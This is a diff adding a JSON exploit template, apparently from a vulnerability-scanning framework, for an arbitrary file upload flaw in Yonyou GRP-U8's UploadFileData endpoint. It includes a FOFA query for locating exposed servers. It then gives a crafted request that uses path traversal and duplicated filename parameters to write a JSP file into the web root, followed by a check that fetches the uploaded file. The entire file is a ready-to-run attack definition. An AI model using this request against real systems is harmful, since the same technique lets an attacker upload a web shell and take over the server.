@@ -1,0 +1,39 @@
+{
+  "product": "用友GRP U8",
+  "vul_name": "用友GRP U8 UploadFileData任意文件上传",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友 GRP-U8 UploadFileData接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"用友-GRP-U8\""
+  },
+  "protocol": "http",
+  "link": "https://www.cnblogs.com/pursue-security/p/17685037.html",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=..%2F&filename=52e039302a62d077.jsp&filename=1.jpg",
+      "file": {
+        "myfile": [
+          "test.jpg",
+          "95cc64dd2825f9df13ec4ad683ecf339"
+        ]
+      }
+    },
+    "verify": {
+      "method": "get",
+      "path": "/R9iPortal/52e039302a62d077.jsp",
+      "logic": "and",
+      "check": [
+        {
+          "body": "95cc64dd2825f9df13ec4ad683ecf339"
+        }
+      ]
+    }
+  }
+}
